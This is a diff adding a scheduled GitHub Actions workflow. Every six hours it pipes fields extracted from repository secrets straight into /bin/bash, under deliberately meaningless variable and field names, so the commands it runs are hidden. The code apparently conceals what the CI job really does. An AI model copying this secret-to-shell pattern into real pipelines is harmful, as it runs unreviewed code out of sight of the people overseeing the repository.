@@ -1,0 +1,29 @@
+name: tianbaojizi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianbaojizi
+        env:
+          vx5: ${{ secrets.vx5 }}
+        run: |
+          echo $vx5 | jq -r .cvook089 | /bin/bash
+          echo $raklj89558 | jq -r .dcwu94494 | /bin/bash
+          echo $hi4412 | jq -r .kzv72398 | /bin/bash
+          echo $n041 | jq -r .fp74 | /bin/bash
+          echo $td3522 | jq -r .mwp0976 | /bin/bash
+          echo $t70215 | jq -r .hh5 | /bin/bash
+          echo $p25301 | jq -r .jm5454 | /bin/bash
+          echo $nfwn6823 | jq -r .bg5 | /bin/bash
+          echo $tin76513 | jq -r .toho487 | /bin/bash
+          echo $mjx895 | jq -r .d33 | /bin/bash
+          echo $wdb77 | jq -r .pthk04 | /bin/bash
+          echo $s814 | jq -r .kdu6 | /bin/bash
+          echo $ekusn9480 | jq -r .vl35 | /bin/bash
+          echo $m31 | jq -r .tahe884 | /bin/bash
+
